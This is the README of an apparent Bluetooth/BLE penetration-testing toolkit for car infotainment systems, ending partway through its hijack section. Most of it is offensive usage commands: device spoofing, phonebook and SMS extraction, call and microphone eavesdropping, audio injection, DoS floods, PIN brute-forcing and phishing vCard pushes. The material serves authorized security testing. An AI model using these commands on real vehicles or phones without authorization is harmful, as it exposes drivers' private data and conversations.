```
  ██████ ████████        ████████ █████  ██████
  ██   ██    ██              ██    ██   ██ ██   ██
  ██████     ██    ██████    ██    ███████ ██████
  ██   ██    ██              ██    ██   ██ ██
  ██████     ██              ██    ██   ██ ██
```

# BT-Tap — Bluetooth/BLE Automotive IVI Pentest Toolkit

**BT-Tap** is a comprehensive Bluetooth Classic and BLE penetration testing framework built for automotive In-Vehicle Infotainment (IVI) security assessments. It automates the full attack chain — from device discovery and service enumeration through identity spoofing, data extraction, call interception, media control, vulnerability scanning, protocol fuzzing, and report generation.

Built in Python with a Rich-powered CLI, BT-Tap wraps the Linux Bluetooth stack (BlueZ, hcitool, bluetoothctl) and provides session-based assessment tracking with auto-report generation across 17 modules, all accessible from a single `bt-tap` entry point.

> **Authorized use only.** This tool is intended for penetration testing engagements, security research, CTF competitions, and educational purposes with explicit authorization. Do not use against systems you do not own or have written permission to test.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Supported Hardware](#supported-hardware)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Guide](#usage-guide)
  - [Global Options](#global-options)
  - [Adapter Management](#adapter-management)
  - [Device Scanning](#device-scanning)
  - [Reconnaissance](#reconnaissance)
  - [MAC Spoofing & Impersonation](#mac-spoofing--impersonation)
  - [PBAP — Phonebook Extraction](#pbap--phonebook-extraction)
  - [MAP — SMS/MMS Extraction](#map--smsmms-extraction)
  - [HFP — Call Interception](#hfp--call-interception)
  - [Audio Capture & Injection](#audio-capture--injection)
  - [AVRCP — Media Control](#avrcp--media-control)
  - [OPP — File Push](#opp--file-push)
  - [AT Command Extraction](#at-command-extraction)
  - [Vulnerability Scanning](#vulnerability-scanning)
  - [Full IVI Hijack](#full-ivi-hijack)
  - [DoS & Pairing Attacks](#dos--pairing-attacks)
  - [Protocol Fuzzing](#protocol-fuzzing)
  - [Report Generation](#report-generation)
  - [Automated Mode](#automated-mode)
- [Verbosity & Debug Output](#verbosity--debug-output)
- [Output Directory Structure](#output-directory-structure)
- [Common Workflows](#common-workflows)
- [Troubleshooting](#troubleshooting)
- [Project Structure](#project-structure)
- [Legal Disclaimer](#legal-disclaimer)

---

## Features

### Discovery & Reconnaissance
- **Classic BT + BLE scanning** — simultaneous or independent device discovery
- **SDP service browsing** — enumerate all advertised Bluetooth services
- **BLE GATT enumeration** — discover services, characteristics, and descriptors
- **Device fingerprinting** — identify IVI manufacturer, chipset, BT version, attack surface
- **RFCOMM channel scanning** — probe all 30 channels for open/hidden services
- **L2CAP PSM scanning** — scan well-known and dynamic PSM ranges
- **Hidden service detection** — diff open channels vs SDP to find unadvertised debug ports
- **SSP detection** — check Secure Simple Pairing support
- **Pairing mode detection** — identify IO capabilities via HCI/LMP analysis
- **HCI traffic capture** — background `btmon` capture with start/stop control

### Attack Profiles
- **PBAP (Phonebook Access)** — download contacts, call logs, favorites, SIM phonebook
- **MAP (Message Access)** — download SMS/MMS from inbox, sent, drafts, all folders
- **HFP (Hands-Free Profile)** — call interception, audio injection, DTMF injection, call hold/swap, redial, voice recognition activation
- **A2DP (Advanced Audio)** — media stream capture, audio injection to car speakers, microphone eavesdropping, live loopback
- **AVRCP (Media Control)** — play/pause/stop/skip, volume manipulation, volume ramp escalation, skip flood DoS, metadata surveillance
- **OPP (Object Push)** — push arbitrary files or crafted vCards to IVI
### Identity Spoofing
- **MAC address spoofing** — multiple backend support (bdaddr, spooftooph, btmgmt) with hardware rejection detection and post-change verification
- **Full identity clone** — MAC + device name + device class
- **Chipset detection** — identifies adapter chipset (Intel, CSR, Broadcom, Realtek) and recommends spoofing strategy
- **Adapter restore** — revert to original MAC after testing

### Vulnerability Assessment (16 Checks)
- **Evidence-based findings** — each result is tagged as `confirmed`, `potential`, or `unverified`
- **Protocol-informed CVE detection** — each check uses the right detection method for the vulnerability, not just version matching:
  - **KNOB (CVE-2019-9506)** — LMP version + pause_encryption feature bit (exploitability indicator)
  - **BIAS (CVE-2020-10135)** — SSP probe + active role-switch test via bias.py
  - **BLURtooth (CVE-2020-15802)** — version range + le_and_bredr dual-mode confirmation (CTKD prerequisite)
  - **BlueBorne (CVE-2017-1000251)** — BlueZ version in SDP provider string
  - **PIN Bypass (CVE-2020-26555)** — no SSP in LMP features = legacy PIN = fundamentally broken
  - **Invalid Curve (CVE-2018-5383)** — BT<5.1 + SSP present (ECDH validation not mandated)
  - **BrakTooth (25 CVEs)** — chipset manufacturer matching (ESP32, CSR, Cypress, Intel, Qualcomm)
  - **PerfektBlue (CVE-2024-45431/32/33/34)** — manufacturer match (VW/Audi/Skoda/Mercedes) + SDP provider + AVRCP presence
- **LMP feature analysis** — parses 64-bit feature bitmask for missing encryption, SSP, Secure Connections, pause_encryption, role_switch
- **Encryption enforcement** — tests if PBAP/MAP/HFP accept unencrypted connections via BT_SECURITY_LOW
- **Authorization model** — sends raw OBEX Connect to PBAP/MAP to test unauthenticated phonebook access
- **Hidden RFCOMM services** — diffs open channels vs SDP to find unadvertised debug/diagnostic ports
- **Automotive diagnostics** — probes SPP/DUN channels with AT and OBD commands for CAN bus access
- **PIN lockout detection** — tests legacy pairing targets for rate-limiting behavior
- **Device class analysis** — CoD service bits (Object Transfer, Networking)
- **EATT detection** — L2CAP PSM 0x0027 probe for BT 5.2+ Enhanced ATT

### Session & Reporting
- **Session tracking** — `--session` flag accumulates all command outputs for unified reporting
- **Auto-report generation** — `bt-tap report` auto-collects all session data
- **Workflow execution** — `bt-tap run` chains multiple commands in sequence
- **Playbook support** — define reusable command sequences in text files

### Offensive Testing
- **Pairing flood DoS** — rapid pairing request bombardment
- **Long name flood** — 248-byte device name memory exhaustion test
- **Rate limiting detection** — measure target's pairing backoff behavior
- **PIN brute-force** — D-Bus Agent1-based legacy PIN enumeration (0000-9999)
- **L2CAP fuzzing** — oversized MTU, malformed packets, null flood
- **RFCOMM fuzzing** — channel exhaustion, large payloads, AT command fuzzing
- **AT format string injection** — `%n%x` / null byte / unicode / overflow patterns

### Interactive Device Selection
- **Auto-scan picker** — omit any MAC address and BT-Tap scans nearby devices, shows a numbered list, and lets you select by number
- **Dual-device picker** — commands needing two MACs (hijack) present "Select TARGET (IVI)" and "Select VICTIM (Phone)" prompts
- **Rescan on demand** — type `r` in the picker to re-scan, `q` to cancel
- **Cached results** — scan results are reused within a session to avoid re-scanning
- **Still CLI-friendly** — pass MAC directly to skip the picker (scripts, automation)

### Orchestration & Reporting
- **Full hijack chain** — 5-phase automated attack: recon → spoof → connect → extract → audio
- **Auto mode** — scan for phones, identify the paired one, run full attack chain, generate report
- **HTML reports** — styled dark-theme pentest reports with vuln tables, data summaries
- **JSON reports** — machine-readable output for toolchain integration
- **Audio review** — list, play, and interactively review captured WAV files

---

## Architecture

```
bt-tap/
├── bt_tap/
│   ├── cli.py                 # Click CLI with session tracking + run command
│   ├── core/
│   │   ├── adapter.py         # HCI adapter management, chipset detection
│   │   ├── scanner.py         # Classic + BLE scanning, CoD parsing, distance
│   │   └── spoofer.py         # MAC spoofing with verification (bdaddr/spooftooph/btmgmt)
│   ├── recon/
│   │   ├── sdp.py             # SDP service browsing, profile version parsing
│   │   ├── gatt.py            # BLE GATT enumeration, UUID lookup, security hints
│   │   ├── fingerprint.py     # Device fingerprint, IVI detection, vuln indicators
│   │   ├── rfcomm_scan.py     # RFCOMM channel scanner (1-30)
│   │   ├── l2cap_scan.py      # L2CAP PSM scanner (standard + dynamic)
│   │   ├── hci_capture.py     # HCI traffic capture (btmon, pcap mode)
│   │   └── sniffer.py         # nRF52840 + USRP B210 capture, key cracking
│   ├── attack/
│   │   ├── pbap.py            # PBAP phonebook (search, photos, stale data)
│   │   ├── map_client.py      # MAP messages (push, notifications, bMessage)
│   │   ├── hfp.py             # HFP calls (codec negotiation, silent call, AT)
│   │   ├── a2dp.py            # A2DP audio (capture, inject, TTS, loopback)
│   │   ├── avrcp.py           # AVRCP media control (D-Bus, player info)
│   │   ├── opp.py             # OPP file push (OBEX)
│   │   ├── bluesnarfer.py     # AT command extraction (RFCOMM)
│   │   ├── bias.py            # BIAS auth bypass (CVE-2020-10135)
│   │   ├── hijack.py          # Full hijack orchestration (5 phases)
│   │   ├── auto.py            # Automated discovery + attack
│   │   ├── vuln_scanner.py    # 15-check vulnerability scanner
│   │   ├── fuzz.py            # L2CAP/RFCOMM/SDP/AT fuzzing
│   │   ├── dos.py             # Pairing flood, l2ping flood, name flood
│   │   └── pin_brute.py       # Legacy PIN brute-force
│   ├── report/
│   │   └── generator.py       # HTML/JSON report (fingerprint, audio, vulns)
│   └── utils/
│       ├── bt_helpers.py      # MAC utils, OUI lookup, adapter state guard
│       ├── session.py         # Session tracking for assessment workflows
│       ├── interactive.py     # Interactive device picker (Classic + BLE)
│       └── output.py          # Rich UI: banner, phases, tables, logging
└── pyproject.toml
```

---

## Supported Hardware

Any Linux-compatible USB Bluetooth adapter that works with BlueZ. For MAC spoofing, the adapter must support at least one of: `bdaddr`, `spooftooph`, or `btmgmt`. For BLE pairing capture: nRF52840 dongle with Nordic sniffer firmware. For BR/EDR piconet sniffing: USRP B210 SDR with gr-bluetooth. For TPMS: RTL-SDR/HackRF/USRP B210 for 315/433 MHz capture via `rtl_433`.

BT-Tap is designed for automotive IVI systems but works against any Bluetooth Classic device — car head units, aftermarket stereos, speakers, IoT devices, and phones.

---

## Prerequisites

### Operating System

- **Linux** (Ubuntu 22.04+, Kali Linux 2023+, Debian 12+, Arch)
- WSL2 with USB passthrough (via `usbipd-win`) works but has limitations with raw HCI
- **Not supported:** macOS, Windows native (no raw BT socket access)

### System Packages

```bash
# Debian/Ubuntu
sudo apt update
sudo apt install -y \
    bluetooth bluez bluez-tools \
    bluez-hcidump \
    libbluetooth-dev \
    libdbus-1-dev libglib2.0-dev \
    pulseaudio-module-bluetooth \
    python3-dev python3-pip

# Kali Linux
sudo apt update
sudo apt install -y \
    bluetooth bluez bluez-tools \
    bluez-hcidump \
    libbluetooth-dev \
    libdbus-1-dev libglib2.0-dev \
    pulseaudio-module-bluetooth \
    python3-dev python3-pip \
    spooftooph bluesnarfer

# Arch Linux
sudo pacman -S bluez bluez-utils pulseaudio-bluetooth python-dbus python-gobject

# Verify Bluetooth stack
bluetoothctl show
```

### Optional Tools

```bash
# Ubuntu 24.04 users: spooftooph and bluesnarfer are not in default apt repos.
# Use btmgmt spoofing method instead:
# sudo bt-tap spoof mac 11:22:33:44:55:66 -m btmgmt

# For external fuzzing (Bluetooth Stack Smasher)
# Build from: https://github.com/pwarren/BSS

# For 315/433 MHz traditional TPMS capture (SDR)
sudo apt install rtl-433     # or build from https://github.com/merbanan/rtl_433
# Requires RTL-SDR dongle ($25), HackRF ($350), or USRP B210 ($1000+)

# For nRF52840 BLE pairing capture
# Flash nRF Sniffer firmware, install Wireshark extcap plugin
# https://www.nordicsemi.com/Products/Development-tools/nrf-sniffer-for-bluetooth-le
pip install nrfutil  # Alternative CLI for nRF52840 sniffer

# For USRP B210 BR/EDR piconet sniffing
sudo apt install uhd-host libuhd-dev  # UHD drivers
# gr-bluetooth for real-time BR/EDR decoding (optional):
# https://github.com/greatscottgadgets/gr-bluetooth

# For BLE/BR/EDR key cracking
# crackle: https://github.com/mikeryan/crackle
```

### Python

- Python 3.10 or higher
- pip or pipx for installation

---

## Installation

### From Source (Recommended)

```bash
git clone https://github.com/yourusername/bt-tap.git
cd bt-tap

# Install in development mode
pip install -e .

# Or with audio extras
pip install -e ".[audio]"

# Verify installation
bt-tap --version
bt-tap --help
```

### Dependencies

Installed automatically via pip:

| Package | Version | Purpose |
|---------|---------|---------|
| `click` | >= 8.1 | CLI framework |
| `rich` | >= 13.0 | Terminal UI (tables, panels, colors, progress) |
| `bleak` | >= 0.21 | BLE scanning and GATT enumeration |
| `PyOBEX` | >= 0.4 | OBEX protocol for PBAP/MAP/OPP |
| `dbus-python` | >= 1.3 | D-Bus interface to BlueZ (AVRCP, PIN agent) |
| `PyGObject` | >= 3.42 | GLib main loop for D-Bus signal monitoring |

Optional:
| `pulsectl` | >= 23.5 | PulseAudio control for audio routing |

### Running Without Install

```bash
# Run directly as a Python module
python3 -m bt_tap.cli --help
python3 -m bt_tap.cli scan classic
```

---

## Quick Start

```bash
# 1. Check your adapter (shows chipset, BT version, spoofing support)
sudo bt-tap adapter list
sudo bt-tap adapter info hci0

# 2. Start a session — all output is auto-logged for reporting
sudo bt-tap -s mytest scan classic -d 15

# 3. Enumerate services (omit MAC for interactive device picker)
sudo bt-tap -s mytest recon sdp AA:BB:CC:DD:EE:FF

# 4. Fingerprint the IVI (identifies manufacturer, BT version, attack surface)
sudo bt-tap -s mytest recon fingerprint AA:BB:CC:DD:EE:FF

# 5. Run vulnerability scan
sudo bt-tap -s mytest vulnscan AA:BB:CC:DD:EE:FF

# 6. Full hijack
sudo bt-tap -s mytest hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24"

# 7. Generate report — auto-collects everything from the session
sudo bt-tap -s mytest report

# Or run a complete workflow in one command:
sudo bt-tap -s mytest run "scan classic" "recon fingerprint TARGET" "vulnscan TARGET" "report"
```

---

## Usage Guide

### Global Options

```bash
bt-tap [OPTIONS] COMMAND [ARGS]

Options:
  --version          Show version and exit
  -v, --verbose      Increase verbosity (-v for verbose, -vv for debug)
  -s, --session TEXT Session name — auto-saves all output for unified reporting
  --help             Show help and exit
```

The `-v` flag controls how much detail you see during execution:

| Flag | Level | What You See |
|------|-------|-------------|
| *(none)* | Normal | Key results, errors, warnings, phase summaries |
| `-v` | Verbose | All of the above + step completion times, SDP record details, raw command args |
| `-vv` | Debug | All of the above + hex dumps, raw HCI output, D-Bus introspection details |

```bash
# Normal: clean output
sudo bt-tap vulnscan AA:BB:CC:DD:EE:FF

# Verbose: see what's happening under the hood
sudo bt-tap -v vulnscan AA:BB:CC:DD:EE:FF

# Debug: full raw output for troubleshooting
sudo bt-tap -vv hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66
```

---

### Interactive Device Picker

Every command that requires a MAC address can be run **without one** — BT-Tap will scan for nearby devices and present an interactive selection menu:

```bash
sudo bt-tap vulnscan                     # picks device interactively
sudo bt-tap recon sdp                    # picks device interactively
sudo bt-tap hfp inject evil_audio.wav    # picks device interactively
sudo bt-tap hijack                       # picks TWO devices interactively
```

**What the picker looks like:**

```
───────────────────────── Device Discovery ─────────────────────────
  12:34:56  ●  Scanning for nearby Bluetooth devices (8s)...
  12:35:04  ✔  Found 4 device(s)

                          Discovered Devices
┏━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━┓
┃    # ┃ Address           ┃ Name              ┃    RSSI ┃ Type    ┃
┡━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━┩
│    1 │ AA:BB:CC:DD:EE:FF │ Toyota Entune 3.0 │ -42 dBm │ Classic │
│    2 │ 11:22:33:44:55:66 │ Galaxy S24        │ -58 dBm │ Classic │
│    3 │ DE:AD:BE:EF:CA:FE │ Unknown           │ -81 dBm │ BLE     │
│    4 │ C0:FF:EE:00:11:22 │ BMW iDrive        │ -65 dBm │ Classic │
└──────┴───────────────────┴───────────────────┴─────────┴─────────┘

  ?  Select device [1-4] (r=rescan, q=quit): 1
  ✔  Selected: Toyota Entune 3.0 (AA:BB:CC:DD:EE:FF)
```

**For commands needing two devices** (like `hijack`), you're prompted twice:

```bash
sudo bt-tap hijack
# → "Select TARGET (IVI/Car) [1-4]:"     → pick the car
# → "Select VICTIM (Phone/Driver) [1-3]:" → pick the phone
```

**Controls:**
| Input | Action |
|-------|--------|
| `1-N` | Select device by number |
| `r` | Rescan for devices |
| `q` | Cancel and quit |

**You can always bypass the picker** by passing the MAC directly — useful for scripts and automation:

```bash
# Explicit MAC — no picker, runs immediately
sudo bt-tap vulnscan AA:BB:CC:DD:EE:FF

# No MAC — interactive picker launches
sudo bt-tap vulnscan
```

---

### Adapter Management

Manage the local HCI Bluetooth adapter.

```bash
# List all adapters with status
sudo bt-tap adapter list

# Bring adapter up / down / reset
sudo bt-tap adapter up hci0
sudo bt-tap adapter down hci0
sudo bt-tap adapter reset hci0

# Set custom device name (for social engineering)
sudo bt-tap adapter set-name hci0 "iPhone 15 Pro"

# Set device class (e.g., smartphone = 0x5a020c)
sudo bt-tap adapter set-class hci0 0x5a020c
```

---

### Device Scanning

Discover nearby Bluetooth Classic and BLE devices.

```bash
# Classic BT scan (10 second default)
sudo bt-tap scan classic

# Extended scan with custom duration and output
sudo bt-tap scan classic -d 30 -i hci0 -o scan_results.json

# BLE scan
sudo bt-tap scan ble -d 15

# Simultaneous Classic + BLE
sudo bt-tap scan all -d 20 -o all_devices.json
```

Output includes: MAC address, device name, RSSI (color-coded by signal strength), and type (Classic/BLE).

---

### Reconnaissance

Deep service enumeration, fingerprinting, and channel scanning.

#### SDP Service Browsing

```bash
# Browse all advertised services
sudo bt-tap recon sdp AA:BB:CC:DD:EE:FF

# Save results to JSON
sudo bt-tap recon sdp AA:BB:CC:DD:EE:FF -o sdp_services.json
```

#### BLE GATT Enumeration

```bash
# Enumerate GATT services and characteristics
sudo bt-tap recon gatt DE:AD:BE:EF:CA:FE -o gatt.json
```

#### Device Fingerprinting

```bash
# Identify manufacturer, chipset, BT version, attack surface
sudo bt-tap recon fingerprint AA:BB:CC:DD:EE:FF -o fingerprint.json
```

#### RFCOMM Channel Scanning

Probes all 30 RFCOMM channels to find open services — including unadvertised/hidden debug ports not listed in SDP.

```bash
# Scan all channels (2s timeout per channel)
sudo bt-tap recon rfcomm-scan AA:BB:CC:DD:EE:FF

# Custom timeout, save results
sudo bt-tap recon rfcomm-scan AA:BB:CC:DD:EE:FF -t 3.0 -o rfcomm.json
```

Each open channel is classified: `at_modem` (AT command interface), `obex` (OBEX/PBAP/MAP), `raw_data` (unknown protocol).

#### L2CAP PSM Scanning

Scans L2CAP Protocol/Service Multiplexer values for open or auth-required services.

```bash
# Quick scan (13 well-known PSMs, ~15 seconds)
sudo bt-tap recon l2cap-scan AA:BB:CC:DD:EE:FF

# Include dynamic PSM range (4097-32767, slow)
sudo bt-tap recon l2cap-scan AA:BB:CC:DD:EE:FF --dynamic

# Custom timeout
sudo bt-tap recon l2cap-scan AA:BB:CC:DD:EE:FF -t 2.0 -o l2cap.json
```

#### SSP & Pairing Detection

```bash
# Check Secure Simple Pairing support
sudo bt-tap recon ssp AA:BB:CC:DD:EE:FF

# Detect pairing mode and IO capabilities via HCI analysis
sudo bt-tap recon pairing-mode AA:BB:CC:DD:EE:FF
```

#### HCI Traffic Capture

Background packet capture using `btmon` — useful for analyzing pairing exchanges, LMP negotiation, and protocol behavior.

```bash
# Start capture (runs btmon in background)
sudo bt-tap recon capture-start -o bt_capture.log

# ... perform your tests ...

# Stop capture
sudo bt-tap recon capture-stop
```

---

### MAC Spoofing & Impersonation

Impersonate another Bluetooth device by cloning its MAC address, name, and device class.

```bash
# Spoof MAC address only
sudo bt-tap spoof mac 11:22:33:44:55:66

# Choose spoofing method explicitly
sudo bt-tap spoof mac 11:22:33:44:55:66 -m bdaddr
sudo bt-tap spoof mac 11:22:33:44:55:66 -m spooftooph
sudo bt-tap spoof mac 11:22:33:44:55:66 -m btmgmt

# Full identity clone (MAC + name + device class)
sudo bt-tap spoof clone 11:22:33:44:55:66 "Galaxy S24"
sudo bt-tap spoof clone 11:22:33:44:55:66 "iPhone 15 Pro" -c 0x7a020c

# Restore original MAC
sudo bt-tap spoof restore
```

**Spoofing methods:**
| Method | Tool | Best For |
|--------|------|----------|
| `auto` | Tries all | Default — picks first working method |
| `bdaddr` | `bdaddr` | CSR chipsets (Panda, Sena) — most reliable |
| `spooftooph` | `spooftooph` | Broader chipset support |
| `btmgmt` | `btmgmt` | BlueZ management API — no extra tools needed |

---

### PBAP — Phonebook Extraction

Download phonebook and call history from a target device via the Phone Book Access Profile.

```bash
# Dump ALL phonebook data (contacts + all call logs + SIM)
sudo bt-tap pbap dump AA:BB:CC:DD:EE:FF -o pbap_output/

# Pull a specific phonebook object
sudo bt-tap pbap pull AA:BB:CC:DD:EE:FF -p "telecom/pb.vcf"
sudo bt-tap pbap pull AA:BB:CC:DD:EE:FF -p "telecom/ich.vcf"   # Incoming calls
sudo bt-tap pbap pull AA:BB:CC:DD:EE:FF -p "telecom/och.vcf"   # Outgoing calls
sudo bt-tap pbap pull AA:BB:CC:DD:EE:FF -p "telecom/mch.vcf"   # Missed calls
sudo bt-tap pbap pull AA:BB:CC:DD:EE:FF -p "SIM1/telecom/pb.vcf"  # SIM contacts

# Specify RFCOMM channel if auto-discovery fails
sudo bt-tap pbap dump AA:BB:CC:DD:EE:FF -c 19
```

**Available PBAP paths:**
| Path | Contents |
|------|----------|
| `telecom/pb.vcf` | Main phonebook |
| `telecom/ich.vcf` | Incoming call history |
| `telecom/och.vcf` | Outgoing call history |
| `telecom/mch.vcf` | Missed call history |
| `telecom/cch.vcf` | Combined call history |
| `telecom/spd.vcf` | Speed dial entries |
| `telecom/fav.vcf` | Favorites |
| `SIM1/telecom/pb.vcf` | SIM phonebook |

---

### MAP — SMS/MMS Extraction

Download text messages via the Message Access Profile.

```bash
# Dump all messages from all folders
sudo bt-tap map dump AA:BB:CC:DD:EE:FF -o map_output/

# List messages in a specific folder
sudo bt-tap map list AA:BB:CC:DD:EE:FF -f inbox
sudo bt-tap map list AA:BB:CC:DD:EE:FF -f sent
sudo bt-tap map list AA:BB:CC:DD:EE:FF -f draft

# Specify RFCOMM channel
sudo bt-tap map dump AA:BB:CC:DD:EE:FF -c 4
```

---

### HFP — Call Interception

Hands-Free Profile operations: call audio capture/injection, DTMF tones, call control.

```bash
# Establish HFP connection
sudo bt-tap hfp connect AA:BB:CC:DD:EE:FF

# Capture call audio to WAV file (60 second recording)
sudo bt-tap hfp capture AA:BB:CC:DD:EE:FF -d 60 -o call_recording.wav

# Inject audio file into active call
sudo bt-tap hfp inject AA:BB:CC:DD:EE:FF evil_audio.wav

# Send raw AT command
sudo bt-tap hfp at AA:BB:CC:DD:EE:FF "AT+CNUM"

# Send DTMF tones (e.g., navigate phone menu)
sudo bt-tap hfp dtmf AA:BB:CC:DD:EE:FF "1234#"
sudo bt-tap hfp dtmf AA:BB:CC:DD:EE:FF "9" --interval 0.5

# Call hold/swap operations
sudo bt-tap hfp hold AA:BB:CC:DD:EE:FF 0   # Release held call
sudo bt-tap hfp hold AA:BB:CC:DD:EE:FF 1   # Hold active, accept waiting
sudo bt-tap hfp hold AA:BB:CC:DD:EE:FF 2   # Swap active/held
sudo bt-tap hfp hold AA:BB:CC:DD:EE:FF 3   # Conference

# Redial last number
sudo bt-tap hfp redial AA:BB:CC:DD:EE:FF

# Activate voice recognition on the IVI
sudo bt-tap hfp voice AA:BB:CC:DD:EE:FF --on
sudo bt-tap hfp voice AA:BB:CC:DD:EE:FF --off
```

---

### Audio Capture & Injection

PulseAudio/PipeWire-based audio operations for eavesdropping and injection via A2DP and HFP.

```bash
# Record from the car's Bluetooth microphone (eavesdrop)
sudo bt-tap audio record-mic -d 120 -o car_mic.wav

# Live eavesdrop: stream car mic to your laptop speakers in real-time
sudo bt-tap audio live

# Play audio file through car speakers via A2DP
sudo bt-tap audio play evil_rickroll.wav

# Route your laptop mic to car speakers (real-time loopback)
sudo bt-tap audio loopback
sudo bt-tap audio loopback-stop

# Capture A2DP media stream (what the car is playing)
sudo bt-tap audio capture -d 300 -o media_capture.wav

# Switch Bluetooth audio profile
sudo bt-tap audio profile hfp     # HFP mode (microphone access)
sudo bt-tap audio profile a2dp    # A2DP mode (media streaming)

# List Bluetooth audio devices
sudo bt-tap audio devices

# Diagnose audio issues
sudo bt-tap audio diagnose

# Restart PulseAudio/PipeWire
sudo bt-tap audio restart

# List all captured WAV files with duration and size
sudo bt-tap audio list --dir ./hijack_output

# Play a specific capture
sudo bt-tap audio playback call_recording.wav

# Interactive review mode: list → select → play → repeat
sudo bt-tap audio review --dir ./hijack_output
```

---

### AVRCP — Media Control

Control media playback and volume on paired IVI/audio devices via the Audio/Video Remote Control Profile (D-Bus/BlueZ).

```bash
# Transport controls
sudo bt-tap avrcp play AA:BB:CC:DD:EE:FF
sudo bt-tap avrcp pause AA:BB:CC:DD:EE:FF
sudo bt-tap avrcp stop AA:BB:CC:DD:EE:FF
sudo bt-tap avrcp next AA:BB:CC:DD:EE:FF
sudo bt-tap avrcp prev AA:BB:CC:DD:EE:FF

# Set volume (0-127)
sudo bt-tap avrcp volume AA:BB:CC:DD:EE:FF 127

# Volume ramp attack (gradually escalate from 0 to max)
sudo bt-tap avrcp volume-ramp AA:BB:CC:DD:EE:FF --start 0 --end 127 --step-ms 100

# Track skip flood (DoS media playback)
sudo bt-tap avrcp skip-flood AA:BB:CC:DD:EE:FF --count 200 --interval 0.05

# Show current track metadata
sudo bt-tap avrcp metadata AA:BB:CC:DD:EE:FF

# Monitor track changes in real-time (passive surveillance)
sudo bt-tap avrcp monitor AA:BB:CC:DD:EE:FF -d 600
```

---

### OPP — File Push

Push files to the target device via Object Push Profile.

```bash
# Push any file
sudo bt-tap opp push AA:BB:CC:DD:EE:FF payload.vcf

# Push a crafted vCard (inject fake contact into IVI)
sudo bt-tap opp vcard AA:BB:CC:DD:EE:FF -n "IT Support" -p "+1-555-0199" -e "phish@evil.com"

# Specify RFCOMM channel
sudo bt-tap opp push AA:BB:CC:DD:EE:FF malware.vcf -c 9
```

---

### AT Command Extraction

Extract data via AT commands over RFCOMM — a bluesnarfer-style attack for legacy devices.

```bash
# Interactive AT command session
sudo bt-tap at connect AA:BB:CC:DD:EE:FF -c 1

# Automated data dump (phonebook, SMS, device info)
sudo bt-tap at dump AA:BB:CC:DD:EE:FF -o at_output/

# Use bluesnarfer binary for phonebook extraction
sudo bt-tap at snarf AA:BB:CC:DD:EE:FF -m ME          # Phone memory
sudo bt-tap at snarf AA:BB:CC:DD:EE:FF -m SM          # SIM memory
sudo bt-tap at snarf AA:BB:CC:DD:EE:FF -m DC -r 1-50  # Dialed calls 1-50
sudo bt-tap at snarf AA:BB:CC:DD:EE:FF -m RC -r 1-50  # Received calls
sudo bt-tap at snarf AA:BB:CC:DD:EE:FF -m MC -r 1-50  # Missed calls
```

**Memory locations for `--memory` flag:**
| Code | Contents |
|------|----------|
| `ME` | Phone memory |
| `SM` | SIM card memory |
| `DC` | Dialed calls |
| `RC` | Received calls |
| `MC` | Missed calls |
| `FD` | Fixed dialing numbers |
| `ON` | Own numbers |

---

### Vulnerability Scanning

Scan a target for Bluetooth CVE indicators and configuration weaknesses using
an evidence-based model (`confirmed` / `potential` / `unverified`).

```bash
# Full vulnerability scan
sudo bt-tap vulnscan AA:BB:CC:DD:EE:FF

# Specify adapter and save results
sudo bt-tap vulnscan AA:BB:CC:DD:EE:FF -i hci0 -o vulns.json

# Verbose mode shows check details
sudo bt-tap -v vulnscan AA:BB:CC:DD:EE:FF
```

**16 checks performed:**

| # | Check | What It Tests | Max Severity |
|---|-------|--------------|-------------|
| 1 | SSP Detection | Missing Secure Simple Pairing via LMP features | MEDIUM |
| 2 | Service Exposure | Sensitive RFCOMM services (PBAP/MAP/OPP) reachable | MEDIUM |
| 3 | L2CAP Reachability | Target responds to L2CAP echo (l2ping) | INFO |
| 4 | CVE Detection | Protocol-informed checks (see below) | HIGH |
| 5 | Pairing Method | Just Works vs Numeric Comparison vs Passkey | MEDIUM |
| 6 | BLE Writable Surface | Writable GATT characteristics count and UUIDs | INFO |
| 7 | BrakTooth Chipset | Known-vulnerable chipset family (ESP32, CSR, CYW, AX200) | MEDIUM |
| 8 | EATT (BT 5.2+) | Enhanced ATT support via L2CAP PSM 0x0027 | INFO |
| 9 | Hidden RFCOMM | Unadvertised channels (AT modem, OBEX, silent) | CRITICAL |
| 10 | Encryption Enforcement | Sensitive profiles accept BT_SECURITY_LOW connections | HIGH |
| 11 | PIN Lockout | Legacy pairing without rate-limiting | HIGH |
| 12 | Device Class | CoD service bits (Object Transfer, Networking) | MEDIUM |
| 13 | LMP Features | Missing encryption/SSP/SC, pause_encryption, role_switch | CRITICAL |
| 14 | Authorization Model | Unauthenticated OBEX/PBAP access without pairing | CRITICAL |
| 15 | Automotive Diagnostics | CAN bus access via SPP/DUN (ELM327/OBD probes) | CRITICAL |
| 16 | PerfektBlue | OpenSynergy BlueSDK (VW/Audi/Skoda/Mercedes) CVE chain | HIGH |

**CVE detection in Check 4 (protocol-informed, not just version matching):**

| CVE | Detection Method | Confidence |
|-----|-----------------|-----------|
| CVE-2019-9506 (KNOB) | LMP version + pause_encryption feature bit | Low-Medium |
| CVE-2020-10135 (BIAS) | SSP probe + active test via `bt-tap bias` | Low |
| CVE-2020-15802 (BLURtooth) | Version 4.2-5.0 + dual-mode LE+BR/EDR confirmed | Low-Medium |
| CVE-2017-1000251 (BlueBorne) | BlueZ version string in SDP provider | Medium |
| CVE-2020-26555 (PIN Bypass) | No SSP in LMP features + BT<=5.2 | High |
| CVE-2018-5383 (Invalid Curve) | BT<5.1 + SSP present (ECDH validation gap) | Low |
| CVE-2024-45434 (PerfektBlue) | Manufacturer match + AVRCP service present | Low-Medium |

> Note: `vulnscan` is an evidence-based triage tool. Findings are classified as
> `confirmed` (directly observed), `potential` (version/heuristic), or `unverified`
> (requires active exploit validation). Each CVE check documents what CAN vs
> CANNOT be detected from standard HCI.

---

### Full IVI Hijack

The core command: impersonate a phone and extract all data from an IVI in one operation.

```bash
# Full 5-phase hijack
sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24"

# With custom output directory
